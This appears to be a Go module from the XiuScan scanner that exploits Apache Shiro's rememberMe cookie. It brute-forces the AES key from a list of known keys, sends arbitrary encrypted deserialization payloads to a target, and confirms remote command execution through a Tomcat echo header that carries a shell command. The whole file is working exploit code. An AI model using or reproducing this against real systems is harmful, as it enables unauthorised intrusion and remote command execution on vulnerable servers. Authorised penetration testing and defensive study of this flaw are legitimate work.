package shiro

import (
	"encoding/hex"
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"strconv"
	"strings"
)

func CheckShiroKey(target string) string {
	var key string
	for _, v := range keys {
		temp, _ := hex.DecodeString(simplePrincipalCollectionHex)
		data := EncodeCBCShiro(v, temp)
		headers := make(map[string]string)
		headers["Cookie"] = rememberMe + data
		req := &http.Request{
			Url:     http.NewUrl(target),
			Method:  "GET",
			Headers: headers,
		}
		resp := http.DoRequest(req)
		if !http.ContainsCookie(resp, deleteMe) {
			headers["Cookie"] = rememberMe + data + errorCookie
			newReq := &http.Request{
				Url:     http.NewUrl(target),
				Method:  "GET",
				Headers: headers,
			}
			newResp := http.DoRequest(newReq)
			if http.ContainsCookie(newResp, deleteMe) {
				key = v
			}
		}
	}
	return key
}

func SendPayload(key string, payload []byte, target string) {
	data := EncodeCBCShiro(key, payload)
	headers := make(map[string]string)
	headers["Cookie"] = rememberMe + data
	req := &http.Request{
		Url:     http.NewUrl(target),
		Method:  "GET",
		Headers: headers,
	}
	http.DoRequest(req)
}

func CheckTomcatEcho(key string, payload []byte, target string) bool {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "expr __rand_1__ '*' __rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	data := EncodeCBCShiro(key, payload)
	headers := make(map[string]string)
	headers["Testecho"] = "xiuscan"
	headers["Testcmd"] = cmd
	headers["Cookie"] = rememberMe + data
	req := &http.Request{
		Url:     http.NewUrl(target),
		Method:  "GET",
		Headers: headers,
	}
	resp := http.DoRequest(req)
	if resp.Headers["Testecho"] == "xiuscan" {
		if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
			return true
		}
	}
	return false
}
